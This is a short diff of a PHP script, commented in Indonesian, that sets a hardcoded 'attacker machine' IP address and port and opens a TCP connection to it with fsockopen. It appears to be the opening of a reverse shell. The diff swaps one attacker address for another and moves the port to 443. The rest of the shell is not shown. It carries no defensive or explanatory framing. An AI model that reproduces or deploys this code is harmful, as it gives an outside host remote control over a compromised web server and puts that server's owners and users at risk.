@@ -1,7 +1,7 @@
 <?php
 // IP dan port attacker machine
-$ip = "207.148.70.80";
-$port = 421;
+$ip = "45.76.160.49";
+$port = 443;
 
 // Membuka koneksi TCP ke attacker machine
 $socket = fsockopen($ip, $port);
